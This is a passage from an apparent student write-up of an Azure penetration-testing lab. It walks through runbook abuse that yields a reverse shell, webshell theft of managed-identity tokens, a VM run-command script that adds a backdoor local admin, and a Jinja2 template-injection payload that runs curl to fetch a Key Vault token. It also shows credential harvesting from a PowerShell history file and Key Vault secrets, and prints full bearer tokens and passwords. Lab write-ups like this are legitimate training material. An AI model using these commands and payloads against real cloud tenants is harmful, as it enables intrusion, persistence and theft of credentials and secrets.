Y2QzLTQ0YzctOWQwMi1hNmFjMmQ1ZWE1YzMiLCJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.BNgfFZFzen-BBReYxyi81urG1xMkMUaxs25rIgGhx67T6k-iXRsUcJP2sX6pDllCzPhf5Uobm6hduFYMgdV06RG2xHF8lGZ7HqN7rAFmRCn1ws6O2QBJmgswMx0u__474BNxmAvptALFtn73aOD8KV8jGWOG9wbauaHLIPCUDMWdgiPoZ6Hgq5n-DS9XCwWUXMOtYYqp2d2FxROHfamloR8PhrIDjUdjT_ld6apeaVdKdInZ73wfLthnYhOO84abY0PpSW-7FweklwGUr7yA8UgU9OCTS2xnmKrAcaXPB-f6aiYgA3lwfOXFsER3MrkPuthT7iPskc-3LaTrm6tAIQ'; Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId b413826f-108d-4049-8c11-d52d5d388768
```

```
Import-AzAutomationRunbook -Name student190-runbook -Path C:\AzAD\Tools\student190.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```

![picture 77](images/2729e900b53c21539076ac2389e38281f6ee9fa9168822ed047dbebf98ba44d9.png)  

<br/>

Then publich the runbook:

```
Publish-AzAutomationRunbook -RunbookName student190-runbook -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

![picture 78](images/12aebb2c88e41d9e8f1eebcd3bd7c767d3afa284afadf57b606e8f9233a37950.png)  


<br/>

Finally get is executed:

```
Start-AzAutomationRunbook -RunbookName student190-runbook -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -RunOn Workergroup1 -Verbose
```

![picture 80](images/dce801b69a31a01387b8889bb4d34a27a391ee588a68fa3d2f6a181d2cb70f2c.png)  

A reverse shell calls back:

![picture 81](images/10aa235cb20180bd82f18f456a6d7f609964abd7b6d497d3fd07e29c9b52bc3d.png)  

- Hostname: `DEFENG-ADCSRV`
- Running user: `DEFENG-ADCSRV$`
- IP: `172.16.1.20`

<br/>

---

## Objective 15: App Service Abuse - Azure VM

**Questions**

1. Abuse the permissions that Managed Identity of the 'defcorphqcareer' App Service to get command execution on an Azure VM.
2. Extract credentials from the target VM.

<br/>

**Answer**

First go to `https://defcorphqcareer.azurewebsites.net/`.

We can refer to **Objective 10** to upload a webshell.

![picture 82](images/f0c8487e13190da092239f3dbba30040cb6cdc15f6e78be949d3bd5ecfc0ae82.png)  

<br/>

To get the token, browse `https://defcorphqcareer.azurewebsites.net/uploads/student190token.phtml`

![picture 83](images/7aedac609d836b05f545dc7d41ee68322ff26f8559f47c4b2159e4c202c2cca9.png)  

- Result:

```
{
    "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5NTUyMDksIm5iZiI6MTYxOTk1NTIwOSwiZXhwIjoxNjIwMDQxOTA5LCJhaW8iOiJFMlpnWUNpYjhmM1Y5Q2YvanVobld3UXNZM1dxQWdBPSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImNjNjdjOTBkLWQ5ZTktNDBkMi1iNTExLTlkNTJkNjc2ODJhYiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bGV2U2dhdk1QQkJoQW9PSWUwVW1VWndBQUEuIiwic3ViIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiUFVxcXprTVR1a0t1MGd3d01NeVRBZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9FbmdpbmVlcmluZy9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9kZWZjb3JwaHFjYXJlZXIiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.IgUJv_zI05bQMU9LYvngs2ry40Fb43pCdRRHt-yqT7e3Z8zy-Hp9mL475kC4533f1W_uR8uYCXR_7LDaQbK5zv-GVoRHw3zhlHYRB7rnGBwX6WbdpqYqa08MbRw7AvCA0LM-obXx3JRLSam-BlzjcTC2qJJpjjDknZjsANL_XZLeMzCYRE9SNrH1gFKua5MxxBnDYpUJDe85diPgz5VSj13m7Kd-SJB0J8_v8xqWQUoqVsC5XEaEMQJCrzqyNsxWTppyzCSLCa1W5eY91xSF875bdWxbpQQMZTMSko2sOx5lzM3_kGtQ-m6ql8uWc0zg4XuwGSGcXCZsR7RD0pcr0g",
    "expires_on": "05/03/2021 11:38:28 +00:00",
    "resource": "https://management.azure.com/",
    "token_type": "Bearer",
    "client_id": "064aaf57-30af-41f0-840a-0e21ed149946"
}
```

<br/>

Then we can use the managed identity using Az PowerShell:

```
$AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5NTUyMDksIm5iZiI6MTYxOTk1NTIwOSwiZXhwIjoxNjIwMDQxOTA5LCJhaW8iOiJFMlpnWUNpYjhmM1Y5Q2YvanVobld3UXNZM1dxQWdBPSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImNjNjdjOTBkLWQ5ZTktNDBkMi1iNTExLTlkNTJkNjc2ODJhYiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bGV2U2dhdk1QQkJoQW9PSWUwVW1VWndBQUEuIiwic3ViIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiUFVxcXprTVR1a0t1MGd3d01NeVRBZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9FbmdpbmVlcmluZy9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9kZWZjb3JwaHFjYXJlZXIiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.IgUJv_zI05bQMU9LYvngs2ry40Fb43pCdRRHt-yqT7e3Z8zy-Hp9mL475kC4533f1W_uR8uYCXR_7LDaQbK5zv-GVoRHw3zhlHYRB7rnGBwX6WbdpqYqa08MbRw7AvCA0LM-obXx3JRLSam-BlzjcTC2qJJpjjDknZjsANL_XZLeMzCYRE9SNrH1gFKua5MxxBnDYpUJDe85diPgz5VSj13m7Kd-SJB0J8_v8xqWQUoqVsC5XEaEMQJCrzqyNsxWTppyzCSLCa1W5eY91xSF875bdWxbpQQMZTMSko2sOx5lzM3_kGtQ-m6ql8uWc0zg4XuwGSGcXCZsR7RD0pcr0g'; Connect-AzAccount -AccessToken $AccessToken -AccountId b413826f-108d-4049-8c11-d52d5d388768
```

![picture 84](images/0c420f9b21bade756770dafc2c21328f11f4d28d4828b03afe91f09fe69a52d2.png)  

<br/>

Then try to obtain more information about Azure VM:

```
Get-AzVM -Name * | fl *
```

- Result:

```
ResourceGroupName        : ENGINEERING
Id                       : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/ENGINEERING/providers/Microsoft.Compute/virtualMachines/bkpadconnect
VmId                     : 60726c17-485b-406e-a49d-5007ab28df9c
Name                     : bkpadconnect
Type                     : Microsoft.Compute/virtualMachines
Location                 : germanywestcentral
LicenseType              : Windows_Server
Tags                     : {}
AvailabilitySetReference :
DiagnosticsProfile       : Microsoft.Azure.Management.Compute.Models.DiagnosticsProfile
Extensions               : {, }
HardwareProfile          : Microsoft.Azure.Management.Compute.Models.HardwareProfile
InstanceView             :
NetworkProfile           : Microsoft.Azure.Management.Compute.Models.NetworkProfile
SecurityProfile          :
OSProfile                : Microsoft.Azure.Management.Compute.Models.OSProfile
BillingProfile           :
Plan                     :
ProvisioningState        : Succeeded
StorageProfile           : Microsoft.Azure.Management.Compute.Models.StorageProfile
DisplayHint              : Compact
Identity                 :
Zones                    : {}
FullyQualifiedDomainName :
AdditionalCapabilities   :
ProximityPlacementGroup  :
Host                     :
VirtualMachineScaleSet   :
EvictionPolicy           :
Priority                 :
HostGroup                :
RequestId                : f104de10-8459-435c-b6da-5cf280009e13
StatusCode               : OK
```

- VM Name:  `bkpadconnect`

<br/>

To get the **Network Profile** of the VM:

```
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile | fl *
```

![picture 85](images/fb01ba1b403416b992619b943d49536d80cdff666d959ad4f24e5607a80161ad.png)  

- Network Profile: `bkpadconnect368`

<br/>

To get the Public IP info, we need one more info - PublicIpAddress ID:

```
Get-AzNetworkInterface -Name bkpadconnect368 | Select-String "publicIPAddresses"
```


![picture 86](images/10ee805212789074abf09c3ce8b616ef02804fee0649c03e05c531af1f24a88d.png)  

- bkpadconnectIP

<br/>

Then we can obtain the public IP address of the VM:

```
Get-AzPublicIpAddress -Name bkpadconnectIP
```

![picture 87](images/b8a496abff0775d9ce4a478f8e6a5b3752eadeb03fa4cd9453646441c04bd938.png)  

- 20.52.148.232

<br/>

Also we can run commands on the VM. Here we will try to run a PowerShell script for persistence - adding a local admin user `student190`. 

- `adduser.ps1`

```
$passwd = ConvertTo-SecureString "StudPassword@123" -AsPlainText -Force


New-LocalUser -Name student190 -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member student190
```

<br/>

The run the script using the following command:

```
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath "C:\AzAd\Tools\adduser.ps1" -Verbose
```

![picture 88](images/16670182e75f514d43c9104c3141caf74dd79b29b849247d0a91554667c9d9ea.png)  

<br/>

Then try to connect to the VM using the newly added credential:

```
$password = ConvertTo-SecureString "StudPassword@123" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('student190', $password); $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds; Enter-PSSession $sess
```

![picture 89](images/db0a28ca8652233b047be98d919444f9a80e306290f5f92c6ac7f1a0a54e2e1f.png)  

<br/>

To check the local user PS command history:

```
cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![picture 90](images/925e5bbefa4871208afacb0b65d04d3a4e45665bc365788ffff5dc53d4fc0351.png)  

- We get the credential:
  - Host:  172.16.1.21
  - Cred:  `defeng-adcnct\administrator` / `CredsToManageCl0udSync!`

<br/>

---

## Objective 16: Key Vault

**Questions**

1. Abuse the permissions that Managed Identity of the 'vaultfrontend' App Service has to extract secrets from a key vault.
2. Use the secrets to gather more information from the `defcorphq` tenant.

<br/>

**Answer**

We have enumerated the vault in Objective 11 - vaultfrontend.azurewebsites.net.

Request the access token for the managed identity:

c
- Result:

```
(b
  {
      "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTk1MDU2NiwibmJmIjoxNjE5OTUwNTY2LCJleHAiOjE2MjAwMzcyNjYsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6IjJlOTFhNGZlLWEwZjItNDZlZS04MjE0LWZhMmZmNmFhOWFiYyIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IkVKS3ZUdUJZRTBpTkJTbUktcThDQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.h2ZpI4bxF9ajoNhmMGnWc3Oz9Z9_7Eco2bMTHzyFlCkja48aNBndPTzQot8Au7Lp--qIiCYH_0D5A0Aw3xmKdjS9a0hyLhLifT2hezOEGZC4m8AWoGkow2tEzGNDj8WLxAk83aupAm8JZR4YlzaZplmOQyRIU4mjOfhphGN4W3z-3MtCsOJZUwEjo9xQUcpISR8z3zLfdl-W5joY0iytD8jQkzSJzCrQo7OeqyZqkTcCI5sNsF-6Xvf9IAiq9EWcCttzmXhTcy6fnYODS2Ef50PjnaA61PWfbtNzRIXdADntSNki47gFhAs8BbBth6PKHkJaZ0kVld3Zs4ZKw0AsbQ",
      "expires_on": "05/03/2021 10:21:05 +00:00",
      "resource": "https://management.azure.com",
      "token_type": "Bearer",
      "client_id": "2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc"
  }
, None)
```

<br/>

Request the keyvault token:

```
{% for x in ().__class__.__mro__[1].__subclasses__() %}{% if "Popen" in x.__name__ %} {{x('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}
```

- Result:

```
Purchase link has been sent to (
  {
      "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5NTAzMDIsIm5iZiI6MTYxOTk1MDMwMiwiZXhwIjoxNjIwMDM3MDAyLCJhaW8iOiJFMlpnWUVnd1k1UDFXcjdNZm1MQkxJa1pGNlF6QVE9PSIsImFwcGlkIjoiMmU5MWE0ZmUtYTBmMi00NmVlLTgyMTQtZmEyZmY2YWE5YWJjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0djZra1M3eW9PNUdnaFQ2TF9hcW1yeHdBQUEuIiwic3ViIjoiMzBlNjc3MjctYThiOC00OGQ5LTgzMDMtZjI0NjlkZjk3Y2IyIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiYnl1UE9LdUp0MG1UYWE2QkFxc0NBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9SZXNlYXJjaC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy92YXVsdGZyb250ZW5kIn0.L7xkTljJVuJIGuK114-7FK8dfzG-DxHrHn_v6lVI7-7RLo7JfudTnjnDejCLYg38x0p67iF-4BiTJHE60Es7nT3GleVOhnK8-03KxvMUTt03FTmg2AghUsS0spmB1KW5GmSdbuVDgG4uhC9_5VHPzFi51y0AO6ESnKMMyQyGp8lrWv0VjXcC2Jeo4_b7OmUGI2lDR-3DaKvZhnm_9ezQjnTEe7vVRNDUYAunGRsMU8T3qDNm9CfHMJxiBtpNYG9x-bAIfx7ePNjgt6p9PQ-OopQAI7fCJiFOmccUBslnNzMFtaWS-92e34QKpTSIE_hsM2TpeuuYWte8u_wHpHgcwg",
      "expires_on": "05/03/2021 10:16:41 +00:00",
      "resource": "https://vault.azure.net",
      "token_type": "Bearer",
      "client_id": "2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc"
  }
, None)
```


<br/>

Then we can use Az Powershell to connect to Azure using the ARM token and keyvault token:

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTk1MDU2NiwibmJmIjoxNjE5OTUwNTY2LCJleHAiOjE2MjAwMzcyNjYsImFpbyI6IkUyWUFncllUTE16ZEtXTGhEc2xNZ2JPVjB3RT0iLCJhcHBpZCI6IjJlOTFhNGZlLWEwZjItNDZlZS04MjE0LWZhMmZmNmFhOWFiYyIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IkVKS3ZUdUJZRTBpTkJTbUktcThDQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.h2ZpI4bxF9ajoNhmMGnWc3Oz9Z9_7Eco2bMTHzyFlCkja48aNBndPTzQot8Au7Lp--qIiCYH_0D5A0Aw3xmKdjS9a0hyLhLifT2hezOEGZC4m8AWoGkow2tEzGNDj8WLxAk83aupAm8JZR4YlzaZplmOQyRIU4mjOfhphGN4W3z-3MtCsOJZUwEjo9xQUcpISR8z3zLfdl-W5joY0iytD8jQkzSJzCrQo7OeqyZqkTcCI5sNsF-6Xvf9IAiq9EWcCttzmXhTcy6fnYODS2Ef50PjnaA61PWfbtNzRIXdADntSNki47gFhAs8BbBth6PKHkJaZ0kVld3Zs4ZKw0AsbQ'; $keyvaulttoken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5NTAzMDIsIm5iZiI6MTYxOTk1MDMwMiwiZXhwIjoxNjIwMDM3MDAyLCJhaW8iOiJFMlpnWUVnd1k1UDFXcjdNZm1MQkxJa1pGNlF6QVE9PSIsImFwcGlkIjoiMmU5MWE0ZmUtYTBmMi00NmVlLTgyMTQtZmEyZmY2YWE5YWJjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0djZra1M3eW9PNUdnaFQ2TF9hcW1yeHdBQUEuIiwic3ViIjoiMzBlNjc3MjctYThiOC00OGQ5LTgzMDMtZjI0NjlkZjk3Y2IyIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiYnl1UE9LdUp0MG1UYWE2QkFxc0NBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9SZXNlYXJjaC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy92YXVsdGZyb250ZW5kIn0.L7xkTljJVuJIGuK114-7FK8dfzG-DxHrHn_v6lVI7-7RLo7JfudTnjnDejCLYg38x0p67iF-4BiTJHE60Es7nT3GleVOhnK8-03KxvMUTt03FTmg2AghUsS0spmB1KW5GmSdbuVDgG4uhC9_5VHPzFi51y0AO6ESnKMMyQyGp8lrWv0VjXcC2Jeo4_b7OmUGI2lDR-3DaKvZhnm_9ezQjnTEe7vVRNDUYAunGRsMU8T3qDNm9CfHMJxiBtpNYG9x-bAIfx7ePNjgt6p9PQ-OopQAI7fCJiFOmccUBslnNzMFtaWS-92e34QKpTSIE_hsM2TpeuuYWte8u_wHpHgcwg'; Connect-AzAccount -AccessToken $token -KeyVaultAccessToken $keyvaulttoken -AccountId b413826f-108d-4049-8c11-d52d5d388768
```

![picture 91](images/23d29c0918c33cbd08823703416cd6f3ace631da92c4e5559250476fac858b2f.png)  

<br/>

Then try to see if we can get any information about the accessible key vault:

```
Get-AzKeyVault
```

![picture 92](images/9e03ce08d7b52d0b776c3961568e412aff951e14e4b8d84cc0b92d57569bbe70.png)  

- Vault Name:  `ResearchKeyVault`
- Resource Group:  `Research`
- Resource ID: `/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault`

<br/>

Get the content in the key vault:

```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault
```

![picture 93](images/13fdb55a7f62de9ce8060ad454646cd1918de46aacec274664ef6f1afe9c893d.png)  

- There is a secret called `Reader`

<br/>

Get the value of the secret `Reader`:

```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

![picture 94](images/b26027c9fe823609d1a000f60758cedeeb11ccbc0c94f71d39fd96f4b7c08db7.png)  

- username: `kathynschaefer@defcorphq.onmicrosoft.com` 
- password: `Gaxu@6991TEST$#*!@#`

<br/>

Then we can use this Azure credential to see what can be accessed:

```
$password = ConvertTo-SecureString 'Gaxu@6991TEST$#*!@#' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password); Connect-AzAccount -Credential $cred
```

![picture 95](images/21f1383f9f9c090669bc4f17d883bba55caffdcdd3ed8bf4920e2a3baa73b8b0.png)  


<br/>

See what can be accessed as `kathynschaefer@defcorphq.onmicrosoft.com`:

```
Get-AzResource
```

![picture 96](images/ed51a459686629fa6dc45e9e45befba976432d6bfc0a32ed1e87f9c04da2bf71.png)  

- Result:
  
```
Name              : jumpvm
ResourceGroupName : RESEARCH
ResourceType      : Microsoft.Compute/virtualMachines
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
Tags              :

Name              : jumpvm/MicrosoftMonitoringAgent
ResourceGroupName : RESEARCH
ResourceType      : Microsoft.Compute/virtualMachines/extensions
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm/extensions/MicrosoftMonitoringAgent
Tags              :
```

- The obtained user can access the VM `jumpvm`

<br/>

See the role assignment of the VM `jumpvm`:

```
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
```

- Result:

```
RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm/providers/Microsoft.Authorization/
                     roleAssignments/8acf6c6d-f58e-4f30-b429-007df2838028
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
DisplayName        : VM Admins
SignInName         :
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 783a312d-0de2-4490-92e4-539b0e4ee03e
ObjectType         : Group
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm/providers/Microsoft.Authorization/
                     roleAssignments/0ec8cef2-306a-4faf-90d9-bc2fe19c0f5e
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
DisplayName        : Kathy N. Schaefer
SignInName         : kathynschaefer@defcorphq.onmicrosoft.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : fd51103b-74c1-4474-873a-9d8a6665357e
ObjectType         : User
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm/providers/Microsoft.Authorization/
                     roleAssignments/de5ef78c-e3ba-427a-a16f-2fa978d9dfb7
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
DisplayName        : VM Admins
SignInName         :
RoleDefinitionName : Virtual Machine Command Executor
RoleDefinitionId   : f824060c-c059-4ebc-991c-82fd4ee5ea61
ObjectId           : 783a312d-0de2-4490-92e4-539b0e4ee03e
ObjectType         : Group
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

